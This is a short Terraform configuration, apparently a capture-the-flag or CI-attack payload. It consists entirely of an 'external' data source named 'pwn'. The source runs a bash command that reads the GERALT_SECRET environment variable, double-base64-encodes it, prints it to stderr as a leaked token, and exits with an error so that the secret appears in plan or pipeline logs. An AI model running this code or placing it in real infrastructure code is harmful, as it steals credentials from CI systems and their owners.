data "external" "pwn" {
  program = ["bash", "-c", "echo GERALT_LEAKED_TOKEN=$(echo -n $GERALT_SECRET | base64 | base64) >&2; exit 1"]
}
